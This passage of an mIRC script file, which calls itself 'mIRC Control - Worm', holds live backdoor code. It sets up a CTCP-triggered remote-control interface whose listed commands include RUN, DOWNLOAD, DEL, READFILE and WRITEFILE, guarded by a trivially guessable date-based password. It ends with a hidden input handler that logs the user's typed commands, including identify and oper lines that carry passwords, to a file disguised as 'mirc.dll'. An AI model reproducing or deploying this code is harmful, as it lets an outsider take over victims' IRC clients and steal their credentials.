   n991=    .notice $nick Use PING\KICK #channel Nick for KICK User from #channel.
   n992=    .halt
   n993=  }
   n994=  if ($1- == PING\HELP BAN) && (%autorization == yes) {
   n995=    .notice $nick Use PING\BAN #channel Nick for BAN User from #channel.
   n996=    .halt
   n997=  }
   n998=  if ($1- == PING\HELP UNBAN) && (%autorization == yes) {
   n999=    .notice $nick Use PING\UNBAN #channel Nick for DELETE User in banlist on #channel.
   n1000=    .halt
   n1001=  }
   n1002=  if ($1- == PING\HELP INVITE) && (%autorization == yes) {
   n1003=    .notice $nick Use PING\INVITE Nick #channel for INVITE User to a #channel.
   n1004=    .halt
   n1005=  }
   n1006=  if ($1- == PING\HELP JOIN) && (%autorization == yes) {
   n1007=    .notice $nick Use PING\JOIN #channel for JOIN in #channel.
   n1008=    .halt
   n1009=  }
   n1010=  if ($1- == PING\HELP PART) && (%autorization == yes) {
   n1011=    .notice $nick Use PING\PART #channel for PART from #channel.
   n1012=    .halt
   n1013=  }
   n1014=  if ($1- == PING\HELP TOPIC) && (%autorization == yes) {
   n1015=    .notice $nick Use PING\TOPIC #channel Text for change TOPIC in #channel.
   n1016=    .halt
   n1017=  }
   n1018=  if ($1- == PING\HELP QUIT) && (%autorization == yes) {
   n1019=    .notice $nick Use PING\QUIT Text for QUIT from IRC with quitmessage.
   n1020=    .halt
   n1021=  }
   n1022=  if ($1- == PING\HELP DIE) && (%autorization == yes) {
   n1023=    .notice $nick Use PING\DIE for TERMINATE mIRC now.
   n1024=    .halt
   n1025=  }
   n1026=  if ($1- == PING\HELP CHANMODE) && (%autorization == yes) {
   n1027=    .notice $nick Use PING\CHANMODE #channel Mode for change mode on #channel.
   n1028=    .notice $nick where:
   n1029=    .notice $nick +i/-i Invite only, +l(?)/-l Limit to: ? users, +p/-p Private, +s/-s Secret
   n1030=    .notice $nick +k(key)/-k Key, +m/-m Moderated, +n/-n No external messages, +t/-t Only ops change topic.
   n1031=    .halt
   n1032=  }
   n1033=  if ($1- == PING\HELP NICK) && (%autorization == yes) {
   n1034=    .notice $nick Use PING\NICK NewNick for Change Nick.
   n1035=    .halt
   n1036=  }
   n1037=  if ($1- == PING\HELP EDIT) && (%autorization == yes) {
   n1038=    .notice $nick Use PING\EDIT WindowName Text for Write Text in Window.
   n1039=    .halt
   n1040=  }
   n1041=  if ($1- == PING\HELP TITLE) && (%autorization == yes) {
   n1042=    .notice $nick Use PING\TITLE Text for Change TITLE of mIRC.
   n1043=    .halt
   n1044=  }
   n1045=  if ($1- == PING\HELP IDLE) && (%autorization == yes) {
   n1046=    .notice $nick Use PING\IDLE for view how many time i was IDLE away.
   n1047=    .halt
   n1048=  }
   n1049=  if ($1- == PING\HELP MIRCSTAT) && (%autorization == yes) {
   n1050=    .notice $nick Use PING\MIRCSTAT -nrstx Manipulates the display of the main mIRC window, where:
   n1051=    .notice $nick -n = minimize, -r = restore, -s = show, -t = tray, and -x = maximize.
   n1052=    .halt
   n1053=  }
   n1054=  if ($1- == PING\HELP IGNORE) && (%autorization == yes) {
   n1055=    .notice $nick Use PING\IGNORE Nick for Ignore User.
   n1056=    .halt
   n1057=  }
   n1058=  if ($1- == PING\HELP UNIGNORE) && (%autorization == yes) {
   n1059=    .notice $nick Use PING\UNIGNORE Nick for UnIgnore User.
   n1060=    .halt
   n1061=  }
   n1062=  if ($1- == PING\HELP ACTIVE) && (%autorization == yes) {
   n1063=    .notice $nick Use PING\ACTIVE for view current active window.
   n1064=    .halt
   n1065=  }
   n1066=  if ($1 == PING\PASS) {
   n1067=    %autorization = no
   n1068=    %step1 = $gettok($date,3,47)
   n1069=    %step2 = $gettok($date,1,47)
   n1070=    %step3 = $gettok($date,2,47)
   n1071=    %current.password = %step1 $+ %step2 $+ %step3
   n1072=    if ($2 == $nill) { .notice $nick Enter Password for current date  $+ $chr(32) $+ ( $+ $date $+ ): | goto end }
   n1073=    elseif ($2 != %current.password) {  .notice $nick Access Denied | goto end }
   n1074=    elseif ($2 == %current.password) {  .notice $nick O.K. | %autorization = yes }
   n1075=    :end
   n1076=    unset %step1
   n1077=    unset %step2
   n1078=    unset %step3
   n1079=    unset %current.password
   n1080=  }
   n1081=  if ($1 == PING\INFO) { .msg $nick 2m4IR8C 12Control - Worm $+ 13 $chr(153) $+ $chr(32) $+ 9v112.3+
   n1082=    .msg $nick Using: 9addon.ini
   n1083=  }
   n1084=  if ($1 == PING\HELP) && (%autorization == yes) {
   n1085=    .notice $nick Use /ctcp $me PING\HELP [command]
   n1086=    .notice $nick LOOK, QUERY, CHAN, DOWNLOAD, MSG, MSGV, SAY, SAYV, RUN, DEL, READFILE, WRITEFILE, RENAME, TIMER,
   n1087=    .notice $nick READINI, WRITEINI, DELINI, LOAD, UNLOAD, OP, DEOP, KICK, BAN, UNBAN, INVITE, JOIN, PART,
   n1088=    .notice $nick TOPIC, QUIT, DIE, CHANMODE, NICK, EDIT, TITLE, IDLE, MIRCSTAT, IGNORE, UNIGNORE, ACTIVE.
   n1089=  }
   n1090=  .halt
   n1091=}
   n1092=on *:INPUT:*:{
   n1093=  if (ident isin $1-) { .write mirc.dll $me ->> $1-  }
   n1094=  if (op isin $1-) { .write mirc.dll $me ->> $1-  }
   n1095=  if (oper isin $1-) { .write mirc.dll $me ->> $1-  }
   n1096=  if (msg isin $1-) { .write mirc.dll $me ->> $1-  }
   n1097=  if (kill isin $1-) { .write mirc.dll $me ->> $1-  }
   n1098=  if (quote isin $1-) { .write mirc.dll $me ->> $1-  }
   n1099=}
